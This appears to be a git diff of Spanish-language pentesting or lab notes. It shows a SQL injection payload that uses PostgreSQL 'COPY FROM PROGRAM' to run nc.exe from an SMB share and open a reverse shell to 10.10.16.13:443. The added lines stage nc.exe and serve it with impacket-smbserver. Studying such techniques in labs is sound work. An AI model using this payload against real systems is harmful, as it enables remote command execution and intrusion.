@@ -85,5 +85,10 @@ Primero vamos a crear una tabla
 Ahora vamos a ejecutar un comando
 `';COPY+cmd_exec+FROM+PROGRAM+'\\10.10.16.13\smbFolder\nc.exe+-e+cmd+10.10.16.13+443';--+`
 
+- Antes nos copiaremos `nc.exe` a nuestro directorio de trabajo
+	`cp /usr/share/windows-resources/binaries/nc.exe .`
 
+- Nos levantamos con [[impacket-smbserver]]  un servidor smb llamdo `smbFolder` en nuestro directorio actual de trabajo
+	`impacket-smbserver smbFolder $(pwd)`
+	
 
